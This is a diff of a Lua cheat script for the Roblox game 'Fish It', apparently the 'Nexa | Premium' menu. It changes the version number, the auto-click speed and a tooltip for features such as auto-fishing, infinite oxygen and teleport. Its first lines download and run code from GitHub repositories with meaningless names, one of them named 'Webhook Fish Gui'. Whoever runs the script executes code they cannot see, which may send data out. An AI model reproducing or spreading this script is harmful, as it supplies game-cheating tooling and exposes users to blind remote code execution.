@@ -1,3 +1,4 @@
+
 loadstring(game:HttpGet("https://raw.githubusercontent.com/fewnbhefbevfhevfdfveh/ckhsuciceifgeufhefveyfg/refs/heads/main/fwefefhef%20Gui%20Update"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/fewnbhefbevfhevfdfveh/ckhsuciceifgeufhefveyfg/refs/heads/main/Webhook%20Fish%20Gui%20dywfywgfwyfvwydgvy"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/xwvufdwgqudwyfwdvwedyuvwd/gbewufbeufbeugfvr/refs/heads/main/Semua"))()
@@ -29,7 +30,7 @@ SaveManager:SetSubFolder("Lobby")
 -- Window utama
 local Window = Library:CreateWindow({
 	Title = "Nexa | Premium",
-	Footer = "Game: Fish It | Version: 1.4.3 | by Nexa Community",
+	Footer = "Game: Fish It | Version: 1.4.4 | by Nexa Community",
 	Icon = "rbxassetid://131269662643486",
 	NotifySide = "Right",
 	ShowCustomCursor = true,
@@ -380,7 +381,7 @@ local AutoFishState = {
 	MinigameActive = false
 }
 
-local ClickSpeed = 0.0001
+local ClickSpeed = 0.05
 
 local function performClick()
 	FishingController:RequestFishingMinigameClick()
@@ -2591,7 +2592,6 @@ local AntiDrown_Enabled = true
 LocalPlayer:AddToggle("InfinityOxygenToggle", {
 	Text = "Infinity Oxygen",
 	Default = true,
-	Tooltip = "Prevents the player from losing oxygen underwater.",
 })
 
 -- Toggle event
@@ -3200,4 +3200,3 @@ Toggles.TeleportToSavedPos:OnChanged(function(state)
         freezeCharacter()
     end
 end)
-
